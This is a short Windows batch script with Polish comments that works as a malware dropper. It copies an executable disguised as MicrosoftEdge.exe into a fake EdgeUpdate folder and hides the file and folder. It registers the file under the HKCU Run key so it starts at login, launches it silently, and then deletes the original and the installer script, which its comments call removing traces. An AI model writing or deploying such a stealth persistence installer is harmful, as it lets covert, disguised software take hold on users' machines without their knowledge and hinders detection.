@echo off
:: Ukryj echo
cls

:: Ścieżki
set "src=%USERPROFILE%\Desktop\MicrosoftEdge.exe"
set "dest=%LOCALAPPDATA%\Microsoft\EdgeUpdate\MicrosoftEdge.exe"

:: Tworzenie folderu docelowego
mkdir "%LOCALAPPDATA%\Microsoft\EdgeUpdate" >nul 2>&1

:: Kopiowanie pliku
copy "%src%" "%dest%" >nul

:: Ukrywanie pliku i folderu
attrib +h +s "%dest%"
attrib +h +s "%LOCALAPPDATA%\Microsoft\EdgeUpdate"

:: Dodanie do autostartu
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdge" /t REG_SZ /d "%dest%" /f >nul

:: Uruchomienie programu po cichu
start "" /b "%dest%"

:: Odczekanie chwili
timeout /t 3 >nul

:: Usuwanie śladów
del /q "%src%" >nul 2>&1
del /q "%USERPROFILE%\Desktop\install.bat" >nul 2>&1

:: Zakończenie
exit
